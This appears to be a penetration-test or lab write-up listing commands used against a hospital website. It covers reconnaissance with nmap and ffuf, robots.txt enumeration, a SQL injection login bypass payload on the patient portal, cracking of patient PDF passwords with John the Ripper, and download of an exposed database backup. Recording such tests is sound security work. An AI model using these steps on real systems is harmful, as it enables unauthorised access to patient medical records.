# Commands Used

## Reconnaissance
```
whatweb medirozahospital.com
nslookup medirozahospital.com
nmap medirozahospital.com
ffuf -u https://medirozahospital.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

## Enumeration
- Reviewed `https://medirozahospital.com/robots.txt` → disclosed `/patient/`, `/staff/`, `/old/`
- Browsed `/patient/` and `/old/` directly (directory listing was enabled)

## Exploitation — SQL Injection (Patient Portal)
- Target: `https://medirozahospital.com/patient/login.php`
- Tested `'` in username field → raw MySQL syntax error returned
- Tested an arbitrary username → "Username not found"
- Tested `admin` → "Incorrect password" (confirms valid username)
- Bypass payload (username field): `admin'--`

## Post-Exploitation — PDF Password Cracking
```
pdf2john patient_report_1.pdf > hash_report1.txt
pdf2john patient_report_2.pdf > hash_report2.txt
pdf2john patient_report_3.pdf > hash_report3.txt

john --format=pdf --wordlist=/usr/share/wordlists/rockyou.txt hash_report1.txt
john --format=pdf --wordlist=/usr/share/wordlists/rockyou.txt hash_report2.txt
john --format=pdf --wordlist=/usr/share/wordlists/rockyou.txt hash_report3.txt

john --show hash_report1.txt
```

## Discovery — Exposed Backup
- `https://medirozahospital.com/old/` → directory listing exposed `mediroza_db_backup_2019.sql`
- Downloaded directly, no authentication required
